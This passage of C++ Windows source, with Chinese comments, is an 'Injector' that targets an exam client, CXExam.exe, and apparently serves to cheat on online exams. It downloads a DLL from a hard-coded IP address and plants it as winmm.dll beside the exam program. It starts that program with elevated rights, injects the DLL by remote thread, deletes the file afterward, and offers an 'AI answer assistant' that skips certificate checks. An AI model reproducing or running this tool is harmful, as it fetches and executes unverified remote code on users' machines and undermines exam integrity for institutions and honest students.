    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path, nullptr, 
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest)
    {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return L"错误：无法创建HTTP请求";
    }
    
    if (flags & WINHTTP_FLAG_SECURE)
    {
        DWORD secFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID | 
                         SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | 
                         SECURITY_FLAG_IGNORE_UNKNOWN_CA;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    }
    
    std::wstring headers = L"Content-Type: application/json\r\nAuthorization: Bearer ";
    headers += g_aiConfig.apiKey;
    
    BOOL b = WinHttpSendRequest(hRequest, headers.c_str(), -1, utf8Body.get(), 
        utf8Len - 1, utf8Len - 1, 0);
    if (!b)
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return L"错误：发送请求失败";
    }
    
    b = WinHttpReceiveResponse(hRequest, nullptr);
    if (!b)
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return L"错误：接收响应失败";
    }
    
    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
        nullptr, &statusCode, &statusCodeSize, nullptr);
    
    std::string responseData;
    DWORD dwSize = 0;
    BYTE buffer[4096];
    do
    {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
        if (dwSize == 0) break;
        if (dwSize > sizeof(buffer)) dwSize = sizeof(buffer);
        DWORD dwRead = 0;
        if (!WinHttpReadData(hRequest, buffer, dwSize, &dwRead)) break;
        if (dwRead == 0) break;
        responseData.append((char*)buffer, dwRead);
    } while (true);
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    if (statusCode != 200)
    {
        WCHAR errMsg[256];
        wsprintfW(errMsg, L"错误：HTTP %d - ", statusCode);
        std::wstring result = errMsg;
        
        int wlen = MultiByteToWideChar(CP_UTF8, 0, responseData.c_str(), -1, nullptr, 0);
        if (wlen > 0)
        {
            std::unique_ptr<WCHAR[]> wbuf(new WCHAR[wlen]);
            MultiByteToWideChar(CP_UTF8, 0, responseData.c_str(), -1, wbuf.get(), wlen);
            result += wbuf.get();
        }
        return result;
    }
    
    int wlen = MultiByteToWideChar(CP_UTF8, 0, responseData.c_str(), -1, nullptr, 0);
    if (wlen == 0) return L"错误：响应解码失败";
    
    std::unique_ptr<WCHAR[]> wideResponse(new WCHAR[wlen]);
    MultiByteToWideChar(CP_UTF8, 0, responseData.c_str(), -1, wideResponse.get(), wlen);
    
    std::wstring fullResponse = wideResponse.get();
    
    size_t contentPos = fullResponse.find(L"\"content\":\"");
    if (contentPos == std::wstring::npos)
    {
        return L"AI响应：\n" + fullResponse;
    }
    
    contentPos += 11;
    size_t endPos = fullResponse.find(L"\"", contentPos);
    if (endPos == std::wstring::npos) endPos = fullResponse.length();
    
    std::wstring content = fullResponse.substr(contentPos, endPos - contentPos);
    
    pos = 0;
    while ((pos = content.find(L"\\n", pos)) != std::wstring::npos)
    {
        content.replace(pos, 2, L"\r\n");
        pos += 2;
    }
    pos = 0;
    while ((pos = content.find(L"\\\"", pos)) != std::wstring::npos)
    {
        content.replace(pos, 2, L"\"");
        pos += 1;
    }
    
    DebugPrintFormat(L"[AI] Response: %ls", content.c_str());
    return content;
}

static bool FindCxInFolderRecursive(const WCHAR* folder, WCHAR* outPath, int depthLimit = 64)
{
    if (depthLimit <= 0) return false;
    WCHAR pattern[MAX_PATH] = L"";
    size_t lenFolder = lstrlenW(folder);
    if (lenFolder + 2 >= MAX_PATH) return false;
    HRESULT hrp = StringCchPrintfW(pattern, MAX_PATH, L"%s\\*", folder);
    if (FAILED(hrp)) return false;
    WIN32_FIND_DATAW ffd;
    HANDLE hFind = FindFirstFileW(pattern, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return false;
    bool found = false;
    do {
        if (lstrcmpW(ffd.cFileName, L".") == 0 || lstrcmpW(ffd.cFileName, L"..")==0) continue;
        WCHAR full[MAX_PATH] = L"";
        size_t lenName = lstrlenW(ffd.cFileName);
        if (lenFolder + 1 + lenName + 1 >= MAX_PATH)
        {
            continue;
        }
        HRESULT hrf = StringCchPrintfW(full, MAX_PATH, L"%s\\%s", folder, ffd.cFileName);
        if (FAILED(hrf)) continue;
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            if (ffd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;
            if (FindCxInFolderRecursive(full, outPath, depthLimit - 1)) { found = true; break; }
        }
        else
        {
            if (CompareStringW(LOCALE_USER_DEFAULT, NORM_IGNORECASE, ffd.cFileName, -1, L"CXExam.exe", -1) == CSTR_EQUAL)
            {
                lstrcpynW(outPath, full, MAX_PATH);
                found = true; break;
            }
        }
    } while (FindNextFileW(hFind, &ffd));
    FindClose(hFind);
    return found;
}

// 此代码模块中包含的函数的前向声明:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK    AiConfigWndProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK    AiHelperWndProc(HWND, UINT, WPARAM, LPARAM);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    SetupDebugConsole();
    DebugPrintFormat(L"[Boot] Injector started. CmdLine: %ls", GetCommandLineW());

    LoadAiConfig();
    
    RelaunchSelfElevatedIfNeeded();

    // TODO: 在此处放置代码。

    // 初始化 COM（用于文件夹选择对话框等）
    HRESULT hrCo = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    // 初始化 GDI+
    GdiplusStartupInput gdiplusStartupInput;
    if (GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, nullptr) != Ok)
    {
        g_gdiplusToken = 0;
    }

    // 初始化全局字符串
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_PROJECT1, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // 执行应用程序初始化:
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_PROJECT1));

    MSG msg;

    // 主消息循环:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    if (g_hImageBmp) { DeleteObject(g_hImageBmp); g_hImageBmp = nullptr; }
    if (g_gdiplusToken) GdiplusShutdown(g_gdiplusToken);
    if (SUCCEEDED(hrCo)) CoUninitialize();

    return (int) msg.wParam;
}



//
//  函数: MyRegisterClass()
//
//  目标: 注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex = {};

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_PROJECT1));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_PROJECT1);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目标: 保存实例句柄并创建主窗口
//
//   注释:
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // 将实例句柄存储在全局变量中

   DWORD dwStyle = WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU;
   RECT rc = {0, 0, 640, 200};
   AdjustWindowRect(&rc, dwStyle, FALSE);
   int winW = rc.right - rc.left;
   int winH = rc.bottom - rc.top;
   HWND hWnd = CreateWindowW(szWindowClass, szTitle,
      dwStyle,
      CW_USEDEFAULT, 0, winW, winH, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }

   CenterWindowOnScreen(hWnd);
   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目标: 处理主窗口的消息。
//
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_CREATE:
        {
            // 第一阶段 UI
            CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
                WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL,
                8, 8, 500, 26, hWnd, (HMENU)IDC_EDIT_URL, hInst, nullptr);

            CreateWindowW(L"BUTTON", L"进入软件",
                WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
                512, 8, 112, 26, hWnd, (HMENU)IDC_BTN_ENTER, hInst, nullptr);

            CreateWindowW(L"BUTTON", L"访问作者网址",
                WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                8, 36, 112, 24, hWnd, (HMENU)IDC_BTN_VISIT, hInst, nullptr);

            CreateWindowW(L"STATIC", 
                    L"本程序仅用于学习使用，禁止售卖和分发；\n"
                    L"一切违法行为与作者无关。",
                WS_CHILD | WS_VISIBLE | SS_LEFT,
                8, 64, 430, 68, hWnd, (HMENU)IDC_STATIC_DECL, hInst, nullptr);

            // 赞赏按钮（初始显示为按钮，点击后显示图片）
            CreateWindowW(L"BUTTON", L"赞赏", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                0, 0, 10, 12, hWnd, (HMENU)IDC_BTN_DONATE, hInst, nullptr);
            // 图片控件占位（默认隐藏）
            CreateWindowW(L"STATIC", L"", WS_CHILD | SS_BITMAP,
                0, 0, 10, 10, hWnd, (HMENU)IDC_STATIC_IMAGE, hInst, nullptr);
            RepositionImageAndText(hWnd);
            ApplyUIFont(hWnd);

            CreateWindowW(L"STATIC", L"powered by sjyssr",
                WS_CHILD | WS_VISIBLE | SS_CENTER,
                0, 0, 10, 10, hWnd, (HMENU)IDC_STATIC_FOOTER, hInst, nullptr);
            RepositionFooter(hWnd);
        }
        break;
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // 分析菜单选择:
            switch (wmId)
            {
            case IDM_ABOUT:
                MessageBoxW(hWnd,
                    L"GitHub: https://github.com/sjyssr\n\n"
                    L"本程序仅用于学习使用，禁止售卖和分发；\n"
                    L"一切违法行为与作者无关。",
                    L"关于", MB_OK | MB_ICONINFORMATION);
                break;
            case IDC_BTN_DONATE:
                EnsureImageLoaded();
                if (!g_gdipSrc)
                    break;
                {
                    // 创建弹窗显示图片，大小按图片原始尺寸或限制在屏幕合适范围
                    RECT rc; GetClientRect(hWnd, &rc);
                    int maxW = 480; int maxH = 640; // 弹窗最大尺寸
                    UINT w = g_gdipSrc->GetWidth();
                    UINT h = g_gdipSrc->GetHeight();
                    if (w == 0 || h == 0) break;
                    double scale = 1.0;
                    if (w > (UINT)maxW) scale = min(scale, (double)maxW / (double)w);
                    if (h > (UINT)maxH) scale = min(scale, (double)maxH / (double)h);
                    UINT dw = (UINT)(w * scale);
                    UINT dh = (UINT)(h * scale);
                    HBITMAP hbmp = CreateStretchedBitmapFromGdip(g_gdipSrc, dw, dh);
                    if (!hbmp) break;
                    EnsureDonateWndClass();
                    // 居中显示在父窗口附近
                    int winW = dw + 16; int winH = dh + 39;
                    HWND hDlg = CreateWindowExW(WS_EX_TOOLWINDOW, L"DonateWnd", L"赞赏",
                        WS_POPUP | WS_CAPTION | WS_SYSMENU,
                        CW_USEDEFAULT, CW_USEDEFAULT, winW, winH, hWnd, nullptr, hInst, (LPVOID)hbmp);
                    if (hDlg)
                    {
                        CenterWindowOnScreen(hDlg);
                        ShowWindow(hDlg, SW_SHOWNORMAL);
                        UpdateWindow(hDlg);
                    }
                    else
                    {
                        DeleteObject(hbmp);
                    }
                }
                break;
            case IDC_BTN_DONATE2:
                SendMessageW(hWnd, WM_COMMAND, MAKEWPARAM(IDC_BTN_DONATE, BN_CLICKED), 0);
                break;
            case IDC_CHK_AUTO_HIDE:
                {
                    HWND hChk = GetDlgItem(hWnd, IDC_CHK_AUTO_HIDE);
                    if (hChk)
                    {
                        LRESULT state = SendMessageW(hChk, BM_GETCHECK, 0, 0);
                        g_autoHide = (state == BST_CHECKED);
                        SaveAiConfig();
                        DebugPrintFormat(L"[Settings] AutoHide = %d", g_autoHide);
                    }
                }
                break;
            case IDC_BTN_HIDE_TRAY:
                HideWindowToTray(hWnd);
                break;
            case IDC_BTN_AI_CONFIG:
                {
                    WNDCLASSEXW wc = {};
                    wc.cbSize = sizeof(wc);
                    wc.hInstance = hInst;
                    wc.lpszClassName = L"AiConfigWnd";
                    wc.lpfnWndProc = AiConfigWndProc;
                    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
                    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
                    if (!GetClassInfoExW(hInst, L"AiConfigWnd", &wc))
                    {
                        RegisterClassExW(&wc);
                    }
                    
                    HWND hConfigWnd = CreateWindowExW(0, L"AiConfigWnd", L"AI配置",
                        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
                        CW_USEDEFAULT, CW_USEDEFAULT, 500, 280, hWnd, nullptr, hInst, nullptr);
                    if (hConfigWnd)
                    {
                        CenterWindowOnScreen(hConfigWnd);
                        ShowWindow(hConfigWnd, SW_SHOWNORMAL);
                        UpdateWindow(hConfigWnd);
                    }
                }
                break;
            case IDC_BTN_AI_HELPER:
                {
                    if (g_aiWindow && IsWindow(g_aiWindow))
                    {
                        SetForegroundWindow(g_aiWindow);
                        break;
                    }
                    
                    WNDCLASSEXW wc = {};
                    wc.cbSize = sizeof(wc);
                    wc.hInstance = hInst;
                    wc.lpszClassName = L"AiHelperWnd";
                    wc.lpfnWndProc = AiHelperWndProc;
                    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
                    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
                    if (!GetClassInfoExW(hInst, L"AiHelperWnd", &wc))
                    {
                        RegisterClassExW(&wc);
                    }
                    
                    g_aiWindow = CreateWindowExW(0, L"AiHelperWnd", L"AI答题助手",
                        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME,
                        CW_USEDEFAULT, CW_USEDEFAULT, 600, 500, hWnd, nullptr, hInst, nullptr);
                    if (g_aiWindow)
                    {
                        CenterWindowOnScreen(g_aiWindow);
                        ShowWindow(g_aiWindow, SW_SHOWNORMAL);
                        UpdateWindow(g_aiWindow);
                    }
                }
                break;
            // 移除退出菜单项
            case IDM_TRAY_SHOW:
                RestoreWindowFromTray(hWnd);
                break;
            case IDM_TRAY_EXIT:
                RemoveTrayIcon();
                PostQuitMessage(0);
                break;
            case IDC_BTN_VISIT:
                ShellExecuteW(hWnd, L"open", L"http://sjyssr.net", nullptr, nullptr, SW_SHOWNORMAL);
                break;
            case IDC_BTN_ENTER:
                {
                    WCHAR input[256] = {0};
                    GetWindowTextW(GetDlgItem(hWnd, IDC_EDIT_URL), input, 256);

                    auto equalsIgnoreCase = [](const WCHAR* a, const WCHAR* b)->bool{
                        return CompareStringW(LOCALE_USER_DEFAULT, NORM_IGNORECASE, a, -1, b, -1) == CSTR_EQUAL;
                    };

                    if (equalsIgnoreCase(input, L"http://sjyssr.net") ||
                        equalsIgnoreCase(input, L"sjyssr.net") ||
                        equalsIgnoreCase(input, L"aaa"))
                    {
                        // 进入第二阶段 UI
                        ShowWindow(GetDlgItem(hWnd, IDC_EDIT_URL), SW_HIDE);
                        ShowWindow(GetDlgItem(hWnd, IDC_BTN_VISIT), SW_HIDE);
                        ShowWindow(GetDlgItem(hWnd, IDC_BTN_ENTER), SW_HIDE);
                        ShowWindow(GetDlgItem(hWnd, IDC_STATIC_DECL), SW_HIDE);
                        ShowWindow(GetDlgItem(hWnd, IDC_BTN_DONATE), SW_HIDE);
                        ShowWindow(GetDlgItem(hWnd, IDC_STATIC_IMAGE), SW_HIDE);
                        ShowWindow(GetDlgItem(hWnd, IDC_STATIC_IMAGE), SW_HIDE);

                        CreateWindowW(L"STATIC", L"请定位 CXExam.exe：",
                            WS_CHILD | WS_VISIBLE,
                            8, 8, 160, 20, hWnd, (HMENU)IDC_STATIC_STEP2, hInst, nullptr);

                        CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
                            WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | ES_READONLY,
                            8, 28, 360, 24, hWnd, (HMENU)IDC_EDIT_EXE_PATH, hInst, nullptr);

                        CreateWindowW(L"BUTTON", L"浏览...",
                            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                            376, 28, 112, 24, hWnd, (HMENU)IDC_BTN_BROWSE_EXE, hInst, nullptr);

                        CreateWindowW(L"BUTTON", L"启动",
                            WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
                            8, 60, 140, 26, hWnd, (HMENU)IDC_BTN_LAUNCH, hInst, nullptr);

                        HWND hAutoHide = CreateWindowW(L"BUTTON", L"启动后自动隐藏到托盘",
                            WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX,
                            224, 60, 200, 24, hWnd, (HMENU)IDC_CHK_AUTO_HIDE, hInst, nullptr);
                        if (hAutoHide)
                        {
                            SendMessageW(hAutoHide, BM_SETCHECK, g_autoHide ? BST_CHECKED : BST_UNCHECKED, 0);
                        }

                        CreateWindowW(L"BUTTON", L"自动查找",
                            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                            496, 28, 120, 26, hWnd, (HMENU)IDC_BTN_AUTO_FIND, hInst, nullptr);
                        RepositionFooter(hWnd);

                        CreateWindowW(L"STATIC", L"状态：等待操作",
                            WS_CHILD | WS_VISIBLE,
                            8, 92, 614, 22, hWnd, (HMENU)IDC_STATIC_STATUS, hInst, nullptr);

                        CreateWindowW(L"BUTTON", L"AI配置",
                            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                            8, 120, 100, 26, hWnd, (HMENU)IDC_BTN_AI_CONFIG, hInst, nullptr);

                        CreateWindowW(L"BUTTON", L"AI答题助手",
                            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                            116, 120, 100, 26, hWnd, (HMENU)IDC_BTN_AI_HELPER, hInst, nullptr);

                        CreateWindowW(L"BUTTON", L"隐藏到托盘",
                            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                            224, 120, 100, 26, hWnd, (HMENU)IDC_BTN_HIDE_TRAY, hInst, nullptr);

                        g_entered = true;
                        RepositionFooter(hWnd);
                        ApplyUIFont(hWnd);
                        RepositionFooter(hWnd);
                        // 第二界面赞赏按钮：启动右侧
                        CreateWindowW(L"BUTTON", L"赞赏", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                            156, 60, 60, 26, hWnd, (HMENU)IDC_BTN_DONATE2, hInst, nullptr);
                    }
                    else
                    {
                        MessageBoxW(hWnd, L"请输入正确的作者网址", L"提示", MB_OK | MB_ICONINFORMATION);
                    }
                }
                break;
            case IDC_BTN_BROWSE_EXE:
                {
                    OPENFILENAMEW ofn = {};
                    WCHAR filePath[MAX_PATH] = L"";
                    WCHAR filter[] = L"可执行文件 (*.exe)\0*.exe\0所有文件 (*.*)\0*.*\0\0";
                    ofn.lStructSize = sizeof(ofn);
                    ofn.hwndOwner = hWnd;
                    ofn.lpstrFilter = filter;
                    ofn.lpstrFile = filePath;
                    ofn.nMaxFile = MAX_PATH;
                    ofn.Flags = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST;
                    if (GetOpenFileNameW(&ofn))
                    {
                        // 校验是否为 CXExam.exe
                        if (PathMatchSpecW(filePath, L"*\\CXExam.exe"))
                        {
                            lstrcpynW(g_cxExamPath, filePath, MAX_PATH);
                            SetWindowTextW(GetDlgItem(hWnd, IDC_EDIT_EXE_PATH), g_cxExamPath);
                            SetWindowTextW(GetDlgItem(hWnd, IDC_STATIC_STATUS), L"状态：已选择 CXExam.exe");
                        }
                        else
                        {
                            MessageBoxW(hWnd, L"请选择 CXExam.exe", L"提示", MB_OK | MB_ICONWARNING);
                        }
                    }
                }
                break;
            // 已移除下载按钮逻辑（合并至启动流程）
            case IDC_BTN_LAUNCH:
        {
            if (lstrlenW(g_cxExamPath) == 0)
            {
                SetStatus(hWnd, L"状态：未选择 CXExam.exe");
                DebugPrintFormat(L"[Launch] No CXExam.exe selected.");
                break;
            }

            WCHAR folder[MAX_PATH] = L"";
            if (FAILED(StringCchCopyW(folder, _countof(folder), g_cxExamPath))) {
                SetStatus(hWnd, L"状态：路径复制失败（CXExam.exe）");
                DebugPrintFormat(L"[Launch] Failed to copy CXExam.exe path.");
                break;
            }
            PathRemoveFileSpecW(folder);

            WCHAR target[MAX_PATH] = L"";
            if (FAILED(StringCchPrintfW(target, _countof(target), L"%s\\winmm.dll", folder))) {
                SetStatus(hWnd, L"状态：路径拼接失败（winmm.dll）");
                DebugPrintFormat(L"[Launch] Failed to compose winmm.dll path.");
                break;
            }

            // 若 winmm.dll 已存在且非空，跳过下载
            if (FileExistsW(target) && GetFileSizeU64(target) > 0)
            {
                if (FAILED(StringCchCopyW(g_downloadedFile, _countof(g_downloadedFile), target))) {
                    SetStatus(hWnd, L"状态：内部路径设置失败");
                    DebugPrintFormat(L"[Launch] Failed to set downloaded file path.");
                    break;
                }
                DebugPrintFormat(L"[Download] Local dll exists, skip download: %ls", target);
                SetStatus(hWnd, L"状态：资源已就绪，正在启动...");
            }
            else
            {
                const WCHAR* kUrl = L"https://8.141.118.244:10030/down/QCmrBzK1rgqN.dll";
                SetStatus(hWnd, L"状态：下载资源中...");
                DebugPrintFormat(L"[Download] URL -> %s", kUrl);
                DebugPrintFormat(L"[Download] Target -> %s", target);

                auto TryDownloadSilently = [&](const WCHAR* dst)->HRESULT {
                    HRESULT hr = DownloadFileWinHttp(kUrl, dst, false);
                    if (FAILED(hr)) hr = DownloadFileWinHttp(kUrl, dst, true);
                    if (FAILED(hr)) hr = DownloadFileWinInet(kUrl, dst, true);
                    return hr;
                };

                DWORD attrsPre = GetFileAttributesW(target);
                if (attrsPre != INVALID_FILE_ATTRIBUTES && (attrsPre & FILE_ATTRIBUTE_READONLY))
                {
                    SetFileAttributesW(target, attrsPre & ~FILE_ATTRIBUTE_READONLY);
                    DebugPrintFormat(L"[Download] Removed READONLY on %s", target);
                }
                DeleteFileW(target);

                HRESULT hr = TryDownloadSilently(target);
                DebugPrintFormat(L"[Download] Result hr=0x%08X", hr);

                if (SUCCEEDED(hr) && FileExistsW(target) && GetFileSizeU64(target) > 0)
                {
                    if (FAILED(StringCchCopyW(g_downloadedFile, _countof(g_downloadedFile), target))) {
                        SetStatus(hWnd, L"状态：内部路径设置失败");
                        DebugPrintFormat(L"[Download] Failed to set downloaded file path.");
                        break;
                    }
                    SetStatus(hWnd, L"状态：资源已就绪，正在启动...");
                    DebugPrintFormat(L"[Download] Ready. file=%s size=%llu", g_downloadedFile, GetFileSizeU64(g_downloadedFile));
                }
                else
                {
                    SetStatus(hWnd, L"状态：资源下载失败，尝试直接启动...");
                    g_downloadedFile[0] = L'\0';
                    DebugPrintFormat(L"[Download] Failed. hr=0x%08X, will try launch anyway.", hr);
                }
            }

            STARTUPINFOW si = {};
            si.cb = sizeof(si);

            WCHAR dir[MAX_PATH] = L"";
            if (FAILED(StringCchCopyW(dir, _countof(dir), g_cxExamPath))) {
                SetStatus(hWnd, L"状态：路径复制失败（工作目录）");
                DebugPrintFormat(L"[Launch] Failed to copy work directory path.");
                break;
            }
            PathRemoveFileSpecW(dir);

            // 非提权统一使用 runas 提权启动
            if (!IsProcessElevated())
            {
                SHELLEXECUTEINFOW sei = {};
                sei.cbSize = sizeof(sei);
                sei.fMask = SEE_MASK_NOCLOSEPROCESS;
                sei.hwnd = hWnd;
                sei.lpVerb = L"runas";
                sei.lpFile = g_cxExamPath;
                sei.lpParameters = nullptr;
                sei.lpDirectory = dir;
                sei.nShow = SW_SHOWNORMAL;

                DebugPrintFormat(L"[Launch] Not elevated. Starting with runas...");
                if (ShellExecuteExW(&sei) && sei.hProcess)
                {
                    g_processHandle = sei.hProcess;
                    g_processId = GetProcessId(sei.hProcess);
                    SetWindowTextW(GetDlgItem(hWnd, IDC_STATIC_STATUS), L"状态：已启动（管理员权限）...");
                    DebugPrintFormat(L"[Launch] Elevated start success. pid=%lu", g_processId);

                    // 检测及注入 winmm.dll（若未从同目录侧载）
                    Sleep(1200);
                    bool loadedLocal = IsModuleLoadedInProcess(g_processHandle, L"winmm.dll", target);
                    DebugPrintFormat(L"[Launch] Local winmm.dll %ls", loadedLocal ? L"LOADED" : L"NOT loaded");
                    if (!loadedLocal && FileExistsW(target))
                    {
                        DebugPrintFormat(L"[Inject] Try remote LoadLibrary: %ls", target);
                        HRESULT ihr = InjectDllViaCreateRemoteThread(g_processId, target);
                        DebugPrintFormat(L"[Inject] Result hr=0x%08X", ihr);
                        if (SUCCEEDED(ihr))
                        {
                            DebugPrintFormat(L"[Inject] Remote load success.");
                            SetWindowTextW(GetDlgItem(hWnd, IDC_STATIC_STATUS), L"状态：已启动并完成注入");
                        }
                        else
                        {
                            WCHAR emsg[512] = {0};
                            FormatLastErrorMessage((DWORD)((UINT)ihr & 0xFFFF), emsg, _countof(emsg));
                            DebugPrintFormat(L"[Inject] Remote load failed: %ls", emsg);
                            SetWindowTextW(GetDlgItem(hWnd, IDC_STATIC_STATUS), L"状态：已启动，但注入失败");
                        }
                    }

                    HANDLE hThread = CreateThread(nullptr, 0, [](LPVOID param)->DWORD {
                        HWND hwndMain = (HWND)param;
                        if (g_processHandle)
                        {
                            WaitForSingleObject(g_processHandle, INFINITE);
                            CloseHandle(g_processHandle);
                            g_processHandle = nullptr;
                        }
                        if (lstrlenW(g_downloadedFile) > 0)
                        {
                            DeleteFileW(g_downloadedFile);
                            DebugPrintFormat(L"[Cleanup] Deleted %s", g_downloadedFile);
                            g_downloadedFile[0] = L'\0';
                        }
                        PostMessageW(hwndMain, WM_APP + 1, 0, 0);
                        return 0;
                    }, hWnd, 0, nullptr);
                    if (hThread) CloseHandle(hThread);

                    if (g_autoHide)
                    {
                        HideWindowToTray(hWnd);
                    }
                    else
                    {
                        SetForegroundWindow(hWnd);
                    }
                    break;
                }
                else
                {
                    DWORD g2 = GetLastError();
                    WCHAR emsg2[512] = {0};
                    FormatLastErrorMessage(g2, emsg2, _countof(emsg2));
                    DebugPrintFormat(L"[Launch] Elevated start failed. code=%lu, msg=%s", g2, emsg2);
                    SetStatus(hWnd, L"状态：启动失败，请检查管理员权限或UAC提示");
                    break;
                }
            }

            PROCESS_INFORMATION pi = {};
            BOOL ok = CreateProcessW(
                g_cxExamPath,
                nullptr,
                nullptr,
                nullptr,
                FALSE,
                0,
                nullptr,
                dir,
                &si,
                &pi);
            if (!ok)
            {
                DWORD gle = GetLastError();
                WCHAR emsg[512] = {0};
                FormatLastErrorMessage(gle, emsg, _countof(emsg));
                SetStatus(hWnd, L"状态：启动失败，请检查文件是否可执行");
                DebugPrintFormat(L"[Launch] CreateProcessW failed. code=%lu, msg=%s", gle, emsg);
                DebugPrintFormat(L"[Launch] Path=%s, WorkDir=%s", g_cxExamPath, dir);
                break;
            }

            g_processHandle = pi.hProcess;
            g_processId = pi.dwProcessId;
            CloseHandle(pi.hThread);
            SetWindowTextW(GetDlgItem(hWnd, IDC_STATIC_STATUS), L"状态：已启动...");
            DebugPrintFormat(L"[Launch] Started. pid=%lu", g_processId);

            // 检测及注入 winmm.dll（若未从同目录侧载）
            Sleep(1200);
            bool loadedLocal = IsModuleLoadedInProcess(g_processHandle, L"winmm.dll", target);
            DebugPrintFormat(L"[Launch] Local winmm.dll %ls", loadedLocal ? L"LOADED" : L"NOT loaded");
            if (!loadedLocal && FileExistsW(target))
            {
                DebugPrintFormat(L"[Inject] Try remote LoadLibrary: %ls", target);
                HRESULT ihr = InjectDllViaCreateRemoteThread(g_processId, target);
                DebugPrintFormat(L"[Inject] Result hr=0x%08X", ihr);
                if (SUCCEEDED(ihr))
                {
                    DebugPrintFormat(L"[Inject] Remote load success.");
                    SetWindowTextW(GetDlgItem(hWnd, IDC_STATIC_STATUS), L"状态：已启动并完成注入");
                }
                else
                {
                    WCHAR emsg[512] = {0};
                    FormatLastErrorMessage((DWORD)((UINT)ihr & 0xFFFF), emsg, _countof(emsg));
